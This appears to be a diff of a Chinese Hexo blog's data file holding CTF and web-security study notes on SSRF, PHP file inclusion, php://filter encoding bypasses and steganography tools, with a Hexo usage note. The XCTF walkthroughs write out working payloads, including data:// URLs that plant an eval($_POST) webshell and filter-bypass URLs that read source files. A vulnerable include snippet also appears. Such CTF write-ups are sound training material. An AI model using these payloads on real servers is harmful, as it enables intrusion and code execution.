+<h3 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf 服务器请求伪造"></a>ssrf 服务器请求伪造</h3><p>影响到内部系统</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210408290.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210429653.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210449078.png"></p>
+<p><a href="https://blog.csdn.net/weixin_45663905/article/details/108086622">服务器端请求伪造——SSRF_ihszg的博客-CSDN博客_伪造发包服务器</a></p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>可控制变量</p>
+<p>使用函数造成的效果</p>
+<p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。被包含的文件在第三方服务器时，就形成了远程文件包含漏洞。</p>
+<p>　　本地到远程：如果php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
+<p>　　include()：当使用该函数包含文件时，只有代码执行到include（）函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
+<p>　　include_once()：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
+<p>　　require()：跟include唯一不同的是，当产生错误时，include下面继续运行而require停止运行了。</p>
+<p>　　require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>　　看到这四个函数时，看到有参数，且参数可控，没有过滤，或过滤不严，就一定有文件包含漏洞。</p>
+<p>常见漏洞代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[page]))&#123; include $_GET[page];&#125; else&#123;include&quot;home.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>　触发漏洞的条件：</p>
+<p>　　　　web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件。</p>
+<p>　　　　用户能够控制该动态变量。</p>
+<h2 id="文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞"><a href="#文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞" class="headerlink" title="文件包含漏洞概括： 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞"></a>文件包含漏洞概括：<a href="https://blog.csdn.net/Vansnc/article/details/82528395"> 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞</a></h2><h2 id="文件包含漏洞伪协议利用补充："><a href="#文件包含漏洞伪协议利用补充：" class="headerlink" title="文件包含漏洞伪协议利用补充："></a>文件包含漏洞伪协议利用补充：</h2><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php://filter的各种过滤器"></a>php://filter的各种过滤器</h3><p>官方文档介绍的可用过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
+<p>应用链接：<a href="https://blog.csdn.net/qq_44657899/article/details/109300335"> php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
+<p>使用例子链接:</p>
+<p>file_include：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3</a></p>
+<p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
+<p>文件包含的绕过或许也可以尝试一下过滤器绕过的思路</p>
+<p>在这题ctf例题中就是采用的过滤器绕过思路中的</p>
+<p>0x02 Conversion Filters（转换过滤器）</p>
+<p>转换过滤器里的convert.iconv.*</p>
+<p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的（、iconv不是php的默认函数，也是默认安装的模块。需要安装才能用的。）。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br></pre></td></tr></table></figure>
+
+<p>在本例题中</p>
+<p>知道绕过方式后我们回显check.php里面的源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=check.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114012.png"></p>
+<p>如图,本题对过滤器进行了限制,还限制了convert.iconv.*过滤器里的编码类型.但好在该过滤器支持的编码类型多样,所以换种编码类型也能达到绕过效果,(多试几种编码类型)</p>
+<p>本题通关poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114526.png"></p>
+<p>这还有一题也是ctf里面的文件包含形式，这题的过滤代码更多</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025155125.png"></p>
+<p>也是使用这个过滤器问题，多试几次过滤器里面的编码形式就可以得出答案了。</p>
+<p>所以文件包含的绕过思路绝不止一种,多试试.</p>
+]]></content>
       <categories>
-        <category>内网</category>
+        <category>基础知识</category>
       </categories>
       <tags>
-        <tag>内网学习</tag>
+        <tag>基础知识</tag>
       </tags>
   </entry>
   <entry>
@@ -557,6 +584,182 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客文章编写方式</title>
+    <url>/2022/10/15/17-58-19/</url>
+    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
+<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
+<p>然后就是上传图片的操作了</p>
+<p>这是原帖子链接</p>
+<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
+<p>下面我先简单演示</p>
+<p>创建一个新的imgs文件夹,位于</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
+<p>source 目录下</p>
+<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
+<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
+<p>在”格式””图像””设置图片根目录”</p>
+<p>成功后</p>
+<p>如图:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
+<p>随后就是插入图片</p>
+<p>在”格式” “图像” “插入图片”</p>
+<p>一定要记得将图片放在imgs 文件夹中</p>
+<p>这样引用图片时才不会出错</p>
+<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
+<p>最后放上我可爱的草神:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
+]]></content>
+      <categories>
+        <category>使用说明</category>
+      </categories>
+      <tags>
+        <tag>hexo博客搭建说明</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网学习笔记</title>
+    <url>/2022/10/19/10-49-13/</url>
+    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf学习笔记</title>
+    <url>/2022/10/19/10-48-16/</url>
+    <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
+<h2 id="一般有两种模式"><a href="#一般有两种模式" class="headerlink" title="一般有两种模式"></a>一般有两种模式</h2><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>解题模式一般就是入侵网站或者靶机，攻击成功后系统会显示flag或者在某个目录 文件 数据库寻找 Flag，提交到答题系统得分。</p>
+<h4 id="此类比赛的赛题形式如下"><a href="#此类比赛的赛题形式如下" class="headerlink" title="此类比赛的赛题形式如下:"></a>此类比赛的赛题形式如下:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA。</span><br><span class="line">  MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</span><br><span class="line"></span><br><span class="line">PPC(Professionally Program Coder)类型，即编程类题目，题目涉及到编程算法，相比ACM较为容易。</span><br><span class="line"></span><br><span class="line">CRYPTO(Cryptography)类型，即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。</span><br><span class="line"></span><br><span class="line">PWN类型，PWN在黑客俚语中代表着攻破、取得权限，多为溢出类题目。</span><br><span class="line"></span><br><span class="line">REVERSE类型，即逆向工程，题目涉及到软件逆向、破解技术。</span><br><span class="line"></span><br><span class="line">STEGA(Steganography)类型，即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛者获取。</span><br><span class="line"></span><br><span class="line">WEB类型，即题目会涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行等漏洞。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在其中MISC杂项STEGA(隐写术)属实是让人意想不到,初次接触我就被吓到了,此类题目一般以文本加密隐写,声音音频隐写,图像加密隐写等等,在后文我会详细学习记录这方面的内容</p>
+<p><strong>注:隐写项目对于真实环境渗透测试提升不大,不必花大量时间去将其原理弄懂,只求在比赛时能基础分辨其属于什么方面的隐写类型,用什么工具解决,确实不懂时可以遇到时百度.</strong></p>
+<h3 id="攻防赛"><a href="#攻防赛" class="headerlink" title="攻防赛"></a>攻防赛</h3><p>需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分.(听fly师傅说这种类型的比赛可能需要邀请函.)</p>
+<p>此类比赛模式非常激烈,准备需要非常充足,</p>
+<h4 id="需要积累足够的防守方案和-EXP-攻击脚本"><a href="#需要积累足够的防守方案和-EXP-攻击脚本" class="headerlink" title="需要积累足够的防守方案和 EXP 攻击脚本"></a>需要积累足够的防守方案和 EXP 攻击脚本</h4><p>(或许我也可以准备这一类的方案,从小开始这样以后也能在工作时给出一个防御方案或者攻击方案,或许是一个不错的主意.)</p>
+<h1 id="MISC杂项"><a href="#MISC杂项" class="headerlink" title="MISC杂项:"></a>MISC杂项:</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://blog.csdn.net/qq_44204058/article/details/119963209"> CTF学习-MISC杂项解题思路_菜鸟-传奇的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_53105813/article/details/125604924?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">CTF MISC解题思路总结篇_Dalean.的博客-CSDN博客_ctf misc解题思路</a></p>
+<p>我抄,不搜不知道,一搜吓一跳,光这杂项就分为:</p>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作:"></a>文件操作:</h2><p> 判断文件类型     </p>
+<p>文件头残缺/错误 </p>
+<p>文件分离操作</p>
+<p>文件合并操作</p>
+<h2 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写:"></a>文件隐写:</h2><h3 id="图片隐写的常见隐写方法"><a href="#图片隐写的常见隐写方法" class="headerlink" title="图片隐写的常见隐写方法"></a>图片隐写的常见隐写方法</h3><p>1.细微的颜色差别<br>2.GIF图多帧隐藏<br>1.颜色通道隐藏<br>2.不同帧图信息隐藏<br>3.不同帧对比隐写<br>3.Exif信息隐藏<br>4.图片修复<br>1.图片头修<br>2.图片尾修复<br>3.CRC校验修复<br>4.长、宽、高度修复<br>5.最低有效位LSB隐写<br>6.图片加密</p>
+<h4 id="记一次图片修复题目"><a href="#记一次图片修复题目" class="headerlink" title="记一次图片修复题目:"></a>记一次图片修复题目:</h4><p>首先是题目链接:</p>
+<p><a href="https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a></p>
+<p>此次题目是二维码图片被垂直剪切为50份,我们要做的就是找出这50份之间的规律,此次题目文件排布规律是按日期排列.</p>
+<p>使用线上图片合并网站<a href="https://cdkm.com/cn/">https://cdkm.com/cn/</a></p>
+<p>进行图片的水平合并,上传文件时需要我们对文件进行一个按日期升序操作,传入图片合并后我们得到一个二维码</p>
+<img src="/imgs/$%7Bfiilename%7D/%E4%BA%8C%E7%BB%B4%E7%A0%81.png" style="zoom:50%;" />
+
+<p>调亮亮度后扫描二维码就能得到flag了</p>
+<p>flag{You Can Repair A Picture From Splices Baesd On Entropy}</p>
+<h3 id="图片隐写常用工具"><a href="#图片隐写常用工具" class="headerlink" title="图片隐写常用工具"></a>图片隐写常用工具</h3><p><strong>Our Secret</strong></p>
+<p>一款用于文件加密的软件</p>
+<p><strong>Firework</strong></p>
+<p>查看隐写的图片文件，多帧gif啥的都可以使用此工具查看</p>
+<p><strong>Stegsove</strong></p>
+<p> 两张图片大小外观像素等基本相同时可以考虑对两个文件进行像素RGB值 XOB ADD SUB等操作，查看是否有有用的信息<br>等等…..</p>
+<p>用到的时候可以直接百度</p>
+<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3><h4 id="音频隐写例子"><a href="#音频隐写例子" class="headerlink" title="音频隐写例子:"></a>音频隐写例子:</h4><p>音频隐写在我第一次打ctf练习题就遇见了,还是第一个遇见的题目,是攻防世界里的来自银河的声音(<a href="https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a>)</p>
+<p>当时做这题时我听了两遍一开始不知道是什么类型的题目,看攻略得知mp3格式的音频文件使用MP3Stego工具进行加解密,然后我真的傻乎乎的按操作方法进行加解密,最后半个小时弄明白了这个工具的使用方法加解密后从这段音频里得到了 Hello Warld! 这句话,提交后发现不对,再进行分析搜索攻略后才发现flag藏在音频信号里,然后又去下了个MMSSTV工具,专门用于音频信号转换.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019181239.png"></p>
+<p>最后转换出的图片中就包含flag,但这flag是采用栅栏密码加密的,所以图上文字栅栏密码解密就得到flag</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019182134.png"></p>
+<p>**付栅栏密码:**栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。</p>
+<p><strong>付攻略链接:</strong><a href="https://blog.csdn.net/qq_62046273/article/details/127096230">( 攻防世界Misc-来自银河的信号_MUFFINHEAD！的博客-CSDN博客</a></p>
+<h4 id="音频隐写分类"><a href="#音频隐写分类" class="headerlink" title="音频隐写分类:"></a>音频隐写分类:</h4><h5 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h5><p>Audacity，Adobe Audition(简称au)，SilentEye，DeepSound，MMSSTV，e2eSoft，mp3stego。</p>
+<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>第一步当然是先听一下有没有什么关键的信息，比如摩斯电码（有间隔的长短电波），SSTV（连续刺耳的电波），拨号隐写之类的。如果不知道是什么声音先自行百度，听过就不会忘。然后打开以上工具看一看是否存在什么隐写，如果都没有办法的话可以欣赏一下音乐就下号了。</p>
+<h6 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h6><p>wav文件头：<code>52494646E6AD250357415645666D7420</code></p>
+<h6 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h6><p><strong>使用工具：Audacity/Adobe Audition</strong><br><strong>文件类型：wav</strong><br>直接放大即可观察波形图即可。<br>可能存在摩斯电码，或者根据波峰波谷然后转换01二进制</p>
+<h6 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h6><p><strong>使用工具：Audacity</strong><br><strong>文件类型：wav</strong><br>查看多视图</p>
+<h6 id="有key的隐写"><a href="#有key的隐写" class="headerlink" title="有key的隐写"></a>有key的隐写</h6><p><strong>使用工具：silenteye、deepsound</strong><br><strong>文件类型：wav</strong><br>傻瓜式操作，知道这个软件就可以解出来，不知道就解不出。这两种隐写不一定需要key，但是有key一定要考虑这两种隐写。</p>
+<h6 id="拨号隐写"><a href="#拨号隐写" class="headerlink" title="拨号隐写"></a>拨号隐写</h6><p>经常打10086的时候对方可能说需要XX服务请按1，需要XX服务请按2，对于不同的数字有不同的声音，就可以隐写一些数据。可以通过DTMF提取出来。<br>DTMF脚本地址：<a href="https://github.com/ribt/dtmf-decoder">https://github.com/ribt/dtmf-decoder</a></p>
+<h6 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h6><p>慢扫描电视（Slow-scan television 简称SSTV）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。<br>表示这玩意真的出烂了，傻瓜式操作<br><strong>使用工具：</strong>MMSSTV，e2eSoft<br>文件类型：wav<br>这里强推虚拟声卡e2eSoft这个工具。SSTV正常解法需要一台设备播放一台设备收音，还容易收到杂音的干扰，虚拟声卡就可以很好的避免这个问题。</p>
+<h6 id="DIFF"><a href="#DIFF" class="headerlink" title="DIFF"></a>DIFF</h6><p><strong>使用工具：Adobe Audition</strong><br><strong>文件类型：wav</strong></p>
+<h6 id="MP3隐写"><a href="#MP3隐写" class="headerlink" title="MP3隐写"></a>MP3隐写</h6><p><strong>使用工具：mp3stego</strong><br><strong>文件类型：mp3</strong></p>
+<p>工具使用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 隐藏信息</span><br><span class="line"># —E 读取隐藏信息文件的内容，-P 设置密码</span><br><span class="line">encode.exe -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line"># 解密信息</span><br><span class="line">decode.exe -X svega_stego.mp3 -P pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接:"></a>原文链接:</h5><p><a href="https://blog.csdn.net/qq_51652400/article/details/123504708">(CTFmisc常见音频隐写总结_vlan103的博客-CSDN博客_ctf音频隐写</a></p>
+<h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理:"></a>压缩文件处理:</h2><p>1.伪加密</p>
+<p>2.暴力破解</p>
+<p>3.RAR文件格式错误，导致解压不完全</p>
+<h2 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术:"></a>流量取证技术:</h2><p> 工具Wireshark的使用</p>
+<p>无线流量</p>
+<p>usb键盘流量</p>
+<p>键盘流量脚本</p>
+<p>usb鼠标流量分析</p>
+<p>鼠标流量分析脚本</p>
+<p>https流量包分析</p>
+<h1 id="web项目学习"><a href="#web项目学习" class="headerlink" title="web项目学习"></a>web项目学习</h1><h2 id="ctf题目：攻防世界：难度2的-Web-php-include题目"><a href="#ctf题目：攻防世界：难度2的-Web-php-include题目" class="headerlink" title="ctf题目：攻防世界：难度2的 Web_php_include题目"></a>ctf题目：攻防世界：难度2的 Web_php_include题目</h2><p>链接：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3</a></p>
+<p>此题目突破口是php伪协议的运用，</p>
+<p>具体解题可以参考：<a href="https://blog.csdn.net/Mr_helloword/article/details/107929653"> 攻防世界-Web_php_include详解_Mr H的博客-CSDN博客</a></p>
+<p>php伪协议：<a href="https://blog.csdn.net/qq_53142368/article/details/116594299"> PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a></p>
+<h2 id="我的解题过程"><a href="#我的解题过程" class="headerlink" title="我的解题过程"></a>我的解题过程</h2><p>当我拿到题目的时候看到页面如下</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024155409.png"></p>
+<p>第一时间就使用后台扫描工具：御剑 对网站后台进行了扫描</p>
+<p>扫描发现了一个phpmyadmin界面，当时我就想到fly师傅里面记载的phpmyadmin的漏洞利用，翻去查看</p>
+<p>（此网站phpmyadmin后台是无密码的root登录）</p>
+<p>通过一系列操作下来后发现使用phpmyadmin漏洞来解决此题目有点费脑子，因为在运用全局日志文件写入shell和其他方式写入shell都离不开文件的绝对路径，</p>
+<p>在扫描以及信息收集中发现该网站的路径就给了一个“/”并没给出绝对路径，</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024160357.png"></p>
+<p>所以暂时运用phpmyadmin后台那shell的方法不可取</p>
+<h2 id="搜攻略"><a href="#搜攻略" class="headerlink" title="搜攻略"></a>搜攻略</h2><p>在攻略中，老哥给了我们三种通过PHP伪协议拿flag的方法，前两种我都成功拿到了flag，</p>
+<p>但老哥没给出第三种过程，现在我复现一下。</p>
+<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法：</span><br><span class="line">data://text/plain,xxxx(要执行的php代码)</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line">例：</span><br><span class="line">?page=data://text/plain,</span><br><span class="line">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>data伪协议:</p>
+<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
+<p>在这题里面我们通过使用data伪协议写入我们的shell语句</p>
+<p><a href="http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST%5B666%5D);%20?%3E">http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST[666]);%20?%3E</a>      (<?php @eval($_POST[666]); ?>)</p>
+<p><a href="http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==">http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==</a></p>
+<p>两种方式我都试过了,在这题里并没有拦截,使用base64编码和不使用也可以写入shell</p>
+<p>使用菜刀链接到我们的shell</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20221024161817842-1666599525637.png"></p>
+<p>可以看到网站的文件目录,(但我找不到flag文件在哪里,只好抄作业了)</p>
+<p>直接使用虚拟终端cat  打开flag文件</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024162228.png"></p>
+<p>flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意:flag一般形式都不同,像本题就是在=”…”里面: ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
+<h2 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h2><p>此题里面因为存在危险函数:show_source()  才能使用php伪协议破解题目</p>
+<p>所以我们在做题时要留意题中出现的函数是什么有什么功能,不懂可以百度</p>
+<p><strong>重要的还是要细心看题才行,不要养成看到代码就跳过的习惯,不然就白学了.</strong></p>
+<p>show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p>
+<p>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</p>
+<p>show_source() 是 <a href="https://www.runoob.com/php/func-misc-highlight-file.html">highlight_file()</a> 的别名。</p>
+<p><strong>注释：</strong>当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</p>
+<h2 id="其他形式的文件包含题目"><a href="#其他形式的文件包含题目" class="headerlink" title="其他形式的文件包含题目"></a>其他形式的文件包含题目</h2><h3 id="file-include：http-61-147-171-105-62550"><a href="#file-include：http-61-147-171-105-62550" class="headerlink" title="file_include：http://61.147.171.105:62550/"></a>file_include：<a href="http://61.147.171.105:62550/">http://61.147.171.105:62550/</a></h3><p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
+<p>php伪协议：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">(4条消息) 详解php://filter以及死亡绕过_w0s1np的博客-CSDN博客_php://filter</a></p>
+<p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(4条消息) PHP伪协议详解_Snakin_ya的博客-CSDN博客_php伪协议</a></p>
+<p><a href="https://www.php.cn/php-weizijiaocheng-481803.html">PHP伪协议大总结【欢迎收藏】-php教程-PHP中文网</a></p>
+<p>文件包含是一个大项，其中的绕过是一个大学问，这题就涉及其他过滤器的问题。</p>
+<p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">(4条消息) php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
+<p><img src="/imgs/$%7Bfiilename%7D/3.gif"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf学习笔记</tag>
       </tags>
   </entry>
   <entry>
